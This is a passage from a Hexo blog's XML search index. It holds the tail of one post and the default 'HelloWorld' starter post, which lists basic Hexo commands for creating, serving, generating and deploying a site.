class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HelloWorld</title>
      <link href="/2019/hello-world/"/>
      <url>/2019/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><a id="more"></a><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
